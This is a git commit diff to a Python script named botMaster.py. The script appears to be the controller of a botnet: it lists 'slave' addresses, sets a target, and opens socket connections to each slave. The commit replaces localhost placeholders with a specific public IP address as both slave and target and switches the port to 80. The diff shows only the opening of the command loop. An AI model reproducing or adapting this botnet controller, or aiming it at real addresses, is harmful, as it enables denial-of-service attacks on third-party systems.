403579cfb73402782e125f3b50122f481f2785b6
AntonBabelz <66876726+AntonBabelz@users.noreply.github.com>
2020-09-04 17:21:07 +0700

    Update botMaster.py

--- botMaster.py
+++ botMaster.py
@@ -1,10 +1,10 @@
 #!/usr/bin/python
 import socket
 #Put Slave Addresses in addresses array
-addresses=['127.0.0.1','127.0.0.1']
+addresses=['157.55.200.140','157.55.200.140']
 #Set target to url or IP - ie 127.0.0.1 or www.mysite.org
-target = '127.0.0.1'
-port = 1337
+target = '157.55.200.140'
+port = 80
 for host in addresses:
 	master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	master.connect((host,port))
